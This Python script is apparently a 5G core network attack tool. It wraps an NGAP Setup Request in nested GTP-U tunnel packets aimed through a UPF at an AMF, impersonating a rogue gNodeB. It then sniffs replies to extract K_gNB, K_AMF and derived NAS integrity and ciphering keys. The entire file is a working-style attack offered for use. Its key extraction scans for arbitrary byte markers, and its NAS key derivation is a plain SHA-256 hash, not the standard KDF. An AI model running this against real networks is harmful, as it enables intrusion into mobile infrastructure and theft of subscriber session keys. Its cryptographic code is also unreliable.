#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.layers.inet import IP, UDP
from scapy.layers.sctp import SCTP
from scapy.packet import Raw
from scapy.sendrecv import sniff, send
from scapy.contrib.gtp import GTPHeader
import logging
import hashlib
from typing import Dict, Optional
from core.config import TEST_CONFIG, validate_config
from protocol.protocol_layers import craft_ngap_setup_request
 
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

NGAP_PROCEDURE_CODES = {
    0x00: "NGSetupRequest",
    0x15: "NGSetupResponse", 
    0x0E: "InitialContextSetupRequest",
    0x0F: "InitialContextSetupResponse",
    0x29: "UEContextReleaseCommand",
    0x2A: "UEContextReleaseComplete",
    0x26: "DownlinkNASTransport",
    0x2E: "UplinkNASTransport",
    0x14: "InitialUEMessage",
}

NAS_5G_MESSAGE_TYPES = {
    0x41: "RegistrationRequest",
    0x42: "RegistrationAccept",
    0x43: "RegistrationComplete",
    0x44: "RegistrationReject",
    0x45: "DeregistrationRequest",
    0x46: "DeregistrationAccept",
    0x5D: "SecurityModeCommand",
    0x5E: "SecurityModeComplete",
    0x5F: "SecurityModeReject",
    0x56: "AuthenticationRequest",
    0x57: "AuthenticationResponse",
    0x58: "AuthenticationReject",
    0x59: "AuthenticationFailure",
    0x5A: "AuthenticationResult",
    0x66: "ServiceRequest",
    0x67: "ServiceAccept",
    0x68: "ServiceReject",
}

NAS_SECURITY_ALGORITHMS = {
    "integrity": {
        0x00: "NIA0 (null)",
        0x01: "NIA1 (128-5G-IA1 / SNOW)",
        0x02: "NIA2 (128-5G-IA2 / AES)",
        0x03: "NIA3 (128-5G-IA3 / ZUC)",
    },
    "ciphering": {
        0x00: "NEA0 (null)",
        0x01: "NEA1 (128-5G-EA1 / SNOW)",
        0x02: "NEA2 (128-5G-EA2 / AES)",
        0x03: "NEA3 (128-5G-EA3 / ZUC)",
    }
}

def parse_ngap_pdu(raw_payload):
    try:
        if len(raw_payload) < 4:
            return None
        
        pdu_type = (raw_payload[0] >> 5) & 0x07
        procedure_code = raw_payload[1] if len(raw_payload) > 1 else 0
        criticality = (raw_payload[2] >> 6) & 0x03 if len(raw_payload) > 2 else 0
        
        result = {
            "pdu_type": ["initiatingMessage", "successfulOutcome", "unsuccessfulOutcome"][pdu_type] if pdu_type < 3 else "unknown",
            "procedure_code": procedure_code,
            "procedure_name": NGAP_PROCEDURE_CODES.get(procedure_code, f"Unknown(0x{procedure_code:02x})"),
            "criticality": ["reject", "ignore", "notify"][criticality] if criticality < 3 else "unknown",
            "raw_payload": raw_payload,
            "ies": []
        }
        
        if result["procedure_name"] == "NGSetupResponse":
            result["success"] = True
            result["message_type"] = "NG_Setup_Response"
        elif result["procedure_name"] == "InitialContextSetupRequest":
            result["success"] = True
            result["message_type"] = "Initial_Context_Setup"
            result["contains_keys"] = True
        elif "Reject" in result["procedure_name"] or "Failure" in result["procedure_name"]:
            result["success"] = False
            result["message_type"] = result["procedure_name"]
        else:
            result["success"] = None
            result["message_type"] = result["procedure_name"]
        
        return result
    except Exception as e:
        logger.error(f"Failed to parse NGAP PDU: {e}")
        return None

def parse_nas_security_mode_command(nas_payload):
    try:
        if len(nas_payload) < 3:
            return None
        
        epd = nas_payload[0]
        security_header = (nas_payload[1] >> 4) & 0x0F
        message_type = nas_payload[2]
        
        result = {
            "epd": epd,
            "security_header_type": security_header,
            "message_type": message_type,
            "message_name": NAS_5G_MESSAGE_TYPES.get(message_type, f"Unknown(0x{message_type:02x})"),
            "algorithms": {},
            "ngksi": None,
            "replayed_ue_capabilities": None,
        }
        
        if message_type == 0x5D and len(nas_payload) >= 5:
            selected_nas_security = nas_payload[3]
            result["algorithms"]["integrity"] = NAS_SECURITY_ALGORITHMS["integrity"].get(
                (selected_nas_security >> 4) & 0x0F, f"Unknown(0x{(selected_nas_security >> 4) & 0x0F:x})"
            )
            result["algorithms"]["ciphering"] = NAS_SECURITY_ALGORITHMS["ciphering"].get(
                selected_nas_security & 0x0F, f"Unknown(0x{selected_nas_security & 0x0F:x})"
            )
            result["ngksi"] = nas_payload[4] & 0x07 if len(nas_payload) > 4 else None
            logger.info(f"✓ Parsed Security Mode Command:")
            logger.info(f"  Integrity: {result['algorithms']['integrity']}")
            logger.info(f"  Ciphering: {result['algorithms']['ciphering']}")
        
        return result
    except Exception as e:
        logger.error(f"Failed to parse NAS Security Mode Command: {e}")
        return None

def extract_k_gnb_from_initial_context(raw_payload):
    try:
        for i in range(len(raw_payload) - 32):
            if raw_payload[i:i+2] == b'\x00\x5E':
                length = raw_payload[i+2] if i+2 < len(raw_payload) else 0
                if length == 32 and i+3+32 <= len(raw_payload):
                    k_gnb = raw_payload[i+3:i+3+32]
                    return k_gnb.hex()
        return None
    except:
        return None

def derive_nas_keys(k_amf_hex, algorithm_type_int=1, algorithm_id=2):
    try:
        k_amf = bytes.fromhex(k_amf_hex)
        
        fc_nas_int = 0x69
        p0_int = algorithm_type_int.to_bytes(1, 'big')
        l0_int = b'\x00\x01'
        p1_int = algorithm_id.to_bytes(1, 'big')
        l1_int = b'\x00\x01'
        s_int = bytes([fc_nas_int]) + p0_int + l0_int + p1_int + l1_int
        k_nas_int = hashlib.sha256(k_amf + s_int).digest()[:16]
        
        fc_nas_enc = 0x69
        p0_enc = (algorithm_type_int + 1).to_bytes(1, 'big')
        l0_enc = b'\x00\x01'
        p1_enc = algorithm_id.to_bytes(1, 'big')
        l1_enc = b'\x00\x01'
        s_enc = bytes([fc_nas_enc]) + p0_enc + l0_enc + p1_enc + l1_enc
        k_nas_enc = hashlib.sha256(k_amf + s_enc).digest()[:16]
        
        return {
            "k_nas_int": k_nas_int.hex(),
            "k_nas_enc": k_nas_enc.hex(),
        }
    except Exception as e:
        logger.error(f"Key derivation failed: {e}")
        return None

def extract_nas_keys_full(ngap_response):
    try:
        raw = ngap_response.get("raw_payload", b"")
        
        keys = {
            "found": False,
            "k_amf": None,
            "k_gnb": None,
            "k_nas_int": None,
            "k_nas_enc": None,
            "algorithm_integrity": None,
            "algorithm_ciphering": None,
            "nas_messages": [],
        }
        
        k_gnb = extract_k_gnb_from_initial_context(raw)
        if k_gnb:
            keys["k_gnb"] = k_gnb
            keys["found"] = True
            logger.info(f"✓ Extracted K_gNB: {k_gnb[:32]}...")
        
        for i in range(len(raw) - 32):
            if raw[i:i+2] == b'\x00\x2E':
                potential_key = raw[i+4:i+36]
                if len(potential_key) == 32:
                    keys["k_amf"] = potential_key.hex()
                    keys["found"] = True
                    logger.info(f"✓ Extracted K_AMF: {keys['k_amf'][:32]}...")
                    
                    derived = derive_nas_keys(keys["k_amf"])
                    if derived:
                        keys["k_nas_int"] = derived["k_nas_int"]
                        keys["k_nas_enc"] = derived["k_nas_enc"]
                        logger.info(f"✓ Derived K_NAS_INT: {keys['k_nas_int']}")
                        logger.info(f"✓ Derived K_NAS_ENC: {keys['k_nas_enc']}")
        
        nas_pdu_markers = [b'\x7E', b'\x00\x7E']
        for marker in nas_pdu_markers:
            for i in range(len(raw) - 10):
                if raw[i:i+len(marker)] == marker:
                    nas_payload = raw[i:i+50]
                    parsed_nas = parse_nas_security_mode_command(nas_payload)
                    if parsed_nas:
                        keys["nas_messages"].append(parsed_nas)
                        if parsed_nas.get("algorithms"):
                            keys["algorithm_integrity"] = parsed_nas["algorithms"].get("integrity")
                            keys["algorithm_ciphering"] = parsed_nas["algorithms"].get("ciphering")
        
        return keys
    except Exception as e:
        logger.error(f"Full key extraction failed: {e}")
        return {"found": False}

def parse_ngap_response(raw_payload):
    return parse_ngap_pdu(raw_payload)

def extract_nas_keys(ngap_response):
    return extract_nas_keys_full(ngap_response)

def craft_gtpu_tunnel(outer_src_ip, outer_dst_ip, outer_teid, inner_src_ip, inner_dst_ip, inner_teid, inner_payload):
    try:
        inner_gtpu = GTPHeader(teid=inner_teid, gtp_type=255) / IP(src=inner_src_ip, dst=inner_dst_ip) / UDP(sport=2152, dport=2152) / Raw(load=inner_payload)
        outer_packet = IP(src=outer_src_ip, dst=outer_dst_ip) / UDP(sport=2152, dport=2152) / GTPHeader(teid=outer_teid, gtp_type=255) / inner_gtpu
        return outer_packet
    except Exception as e:
        logger.error(f"Failed to craft GTP-U tunnel: {e}")
        return None

def rogue_gnodeb_with_key_extraction(upf_ip, outer_teid, amf_ip, inner_teid, iface=None, timeout=10):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info("=== Rogue gNodeB Registration with Key Extraction ===")
    logger.info(f"Target: AMF at {amf_ip} via UPF at {upf_ip}")
    
    captured_responses = []
    extracted_keys: Optional[Dict] = None
    
    try:
        ngap_setup = craft_ngap_setup_request()
        sctp_payload = IP(dst=amf_ip) / SCTP(sport=38412, dport=38412) / Raw(load=ngap_setup)
        ngap_bytes = bytes(sctp_payload[SCTP])
        
        tunnel_pkt = craft_gtpu_tunnel(
            outer_src_ip=TEST_CONFIG["outer_src"],
            outer_dst_ip=upf_ip,
            outer_teid=outer_teid,
            inner_src_ip=TEST_CONFIG["inner_src"],
            inner_dst_ip=amf_ip,
            inner_teid=inner_teid,
            inner_payload=ngap_bytes
        )
        
        if not tunnel_pkt:
            logger.error("Failed to craft tunnel packet")
            return None
        
        def handle_response(pkt):
            nonlocal captured_responses, extracted_keys
            try:
                if pkt.haslayer(SCTP) and pkt.haslayer(Raw):
                    payload = bytes(pkt[Raw])
                    captured_responses.append(payload)
                    
                    parsed = parse_ngap_response(payload)
                    if parsed:
                        logger.info(f"✓ Captured NGAP {parsed['message_type']}")
                        
                        if parsed.get("success"):
                            keys = extract_nas_keys(parsed)
                            if keys.get("found"):
                                extracted_keys = keys
                                logger.info("✓✓✓ NAS KEYS EXTRACTED ✓✓✓")
                                return True
            except Exception as e:
                logger.debug(f"Error processing response: {e}")
        
        logger.info("Sending NG Setup Request...")
        send(tunnel_pkt, iface=iface, verbose=0)
        
        logger.info(f"Listening for responses (timeout: {timeout}s)...")
        sniff(iface=iface, filter="sctp port 38412", prn=handle_response, timeout=timeout, store=0)
        
        logger.info(f"\nCaptured {len(captured_responses)} NGAP responses")
        
        if extracted_keys is not None and isinstance(extracted_keys, dict) and extracted_keys.get("found"):
            logger.info("\n=== EXTRACTED KEYS ===")
            keys_dict = extracted_keys
            for key_name in keys_dict:
                key_value = keys_dict.get(key_name)
                if key_value and key_name != "found":
                    logger.info(f"{key_name}: {key_value}")
            return extracted_keys
        else:
            logger.warning("No keys extracted from responses")
            return None
    
    except Exception as e:
        logger.error(f"Rogue gNodeB with key extraction failed: {e}")
        return None

if __name__ == "__main__":
    keys = rogue_gnodeb_with_key_extraction(
        TEST_CONFIG["upf_ip"],
        TEST_CONFIG["outer_teid"],
        TEST_CONFIG["amf_ip"],
        TEST_CONFIG["inner_teid"]
    )
    
    if keys:
        logger.info("\n✓ Attack successful - Keys extracted")
    else:
        logger.warning("\n✗ Attack failed - No keys extracted")

